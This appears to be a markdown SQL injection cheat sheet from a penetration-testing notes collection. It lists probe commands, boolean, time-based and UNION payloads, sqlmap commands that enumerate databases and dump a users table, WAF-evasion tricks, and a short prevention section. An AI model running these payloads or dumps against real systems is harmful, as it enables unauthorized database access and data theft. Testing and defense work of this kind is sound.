# SQL Injection — Full

## 1) Error Probes
```bash
curl -ks "$target/search?q=test'"
curl -ks "$target/search?q=test%27"
```

Common DB error signatures listed in [`errors.md`](errors.md).

## 2) Boolean/Time/UNION
```text
# Boolean
' AND 1=1-- -
' AND 1=2-- -

# Time (MySQL / MSSQL / Postgres)
' AND SLEEP(5)-- -
' WAITFOR DELAY '0:0:5'--
' || pg_sleep(5)--

# UNION column count
... UNION SELECT NULL--
... UNION SELECT NULL,NULL--
... UNION SELECT NULL,NULL,NULL--
```

## 3) Enumeration (manual)
See [`enumeration.md`](enumeration.md) for DB‑specific queries (MySQL/MSSQL/Postgres).

## 4) Automation (sqlmap)
```bash
sqlmap -u "$target/search?q=test" --batch
sqlmap -u "$target/search?q=test" -p q --dbs --batch
sqlmap -u "$target/search?q=test" -p q -D acme -T users --columns --batch
sqlmap -u "$target/search?q=test" -p q -D acme -T users --dump --batch
```

## 5) WAF & Evasion
- Inline comments: `UNION/**/SELECT`
- Case toggling: `SeLeCt`, `UnIoN`
- Spacing tricks: `%0a`, `/**/`
- Function equivalents, hex encoding, concatenation

## 6) Prevention (Dev)
- **Parameterized queries** / prepared statements
- Least‑privilege DB users
- Centralized error handling (no raw SQL errors to clients)
- ORM discipline, input validation

Examples in [`prevention.md`](prevention.md).
